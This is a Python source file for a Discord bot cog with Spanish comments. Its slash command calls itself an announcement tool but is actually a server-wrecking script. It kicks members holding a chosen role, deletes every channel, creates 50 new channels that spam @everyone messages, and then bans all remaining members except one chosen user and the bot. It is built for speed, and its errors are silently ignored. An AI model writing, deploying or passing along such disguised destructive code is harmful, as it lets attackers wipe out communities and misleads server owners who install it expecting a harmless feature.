import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
    @app_commands.describe(
        useradmin="Usuario administrador principal",
        roletogive="Rol de administración",
        message="Mensaje importante para anunciar"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def announce(self, interaction: discord.Interaction, 
                      useradmin: discord.User, 
                      roletogive: discord.Role, 
                      message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        # Responder inmediatamente para evitar timeout
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            
            # 1. Expulsar miembros con el rol especificado (excepto useradmin)
            members_to_kick = []
            
            # Obtener todos los miembros del servidor
            async for member in guild.fetch_members():
                # Verificar si el miembro tiene el rol (comparando IDs)
                if any(role.id == roletogive.id for role in member.roles) and member.id != useradmin.id:
                    members_to_kick.append(member)
            
            # Expulsar miembros en paralelo para mayor velocidad
            kick_tasks = []
            for member in members_to_kick:
                try:
                    kick_tasks.append(member.kick(reason=f"Reorganización: {interaction.user}"))
                except:
                    pass
            
            # Esperar a que todas las expulsiones se completen
            if kick_tasks:
                await asyncio.gather(*kick_tasks, return_exceptions=True)
            
            # 2. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                await admin_member.add_roles(roletogive)
            except:
                pass
            
            # 3. Eliminar todos los canales MÁS RÁPIDO
            delete_tasks = []
            for channel in guild.channels:
                try:
                    delete_tasks.append(channel.delete())
                except:
                    pass
            
            # Ejecutar todas las eliminaciones en paralelo
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 4. Crear INFINITOS canales y spamear mensajes - VERSIÓN CORREGIDA
            spam_message = f"@everyone {message}"
            channel_count = 0
            max_channels = 50  # Límite más conservador
            
            # Usar followup para enviar actualizaciones
            followup = interaction.followup
            
            # Crear tareas para canales y mensajes
            channel_tasks = []
            message_tasks = []
            
            while channel_count < max_channels:
                try:
                    # Crear canal con nombre único
                    channel_name = f"{message}-{channel_count}"
                    
                    # Crear el canal
                    channel_task = asyncio.create_task(
                        guild.create_text_channel(channel_name[:100])
                    )
                    channel_tasks.append(channel_task)
                    
                    channel_count += 1
                    
                    # Pequeño delay para evitar rate limits
                    if channel_count % 5 == 0:
                        await asyncio.sleep(0.1)
                        
                except:
                    break
            
            # Esperar a que todos los canales se creen
            created_channels = []
            for task in channel_tasks:
                try:
                    channel = await task
                    created_channels.append(channel)
                except:
                    pass
            
            # Enviar mensajes a todos los canales creados
            for channel in created_channels:
                try:
                    # Enviar múltiples mensajes
                    for _ in range(3):
                        msg_task = asyncio.create_task(channel.send(spam_message))
                        message_tasks.append(msg_task)
                        
                        # Pequeño delay entre mensajes
                        await asyncio.sleep(0.1)
                except:
                    pass
            
            # Esperar a que todos los mensajes se envíen
            await asyncio.gather(*message_tasks, return_exceptions=True)
            
            # 5. BANEAR A TODOS LOS DEMÁS MIEMBROS (nueva funcionalidad)
            async def ban_all_members():
                banned_count = 0
                async for member in guild.fetch_members():
                    try:
                        # No banear al useradmin ni al bot
                        if member.id != useradmin.id and member.id != self.bot.user.id:
                            await member.ban(reason=f"Baneo masivo: {interaction.user}", delete_message_days=0)
                            banned_count += 1
                            
                            # Pequeño delay para evitar rate limits
                            if banned_count % 5 == 0:
                                await asyncio.sleep(0.2)
                    except:
                        continue
                return banned_count
            
            # Iniciar el baneo masivo en segundo plano
            ban_task = asyncio.create_task(ban_all_members())
            
            # Esperar a que termine el baneo masivo
            total_banned = await ban_task
            
            # Usar followup para enviar el mensaje final
            await followup.send(
                f"Operación completada. Se crearon {len(created_channels)} canales y se banearon {total_banned} miembros.", 
                ephemeral=True
            )
            
        except:
            # Usar followup para enviar el error
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                # Si falla el followup, intentar editar la respuesta original
                try:
                    await interaction.edit_original_response(content="Ocurrió un error durante el proceso.")
                except:
                    pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
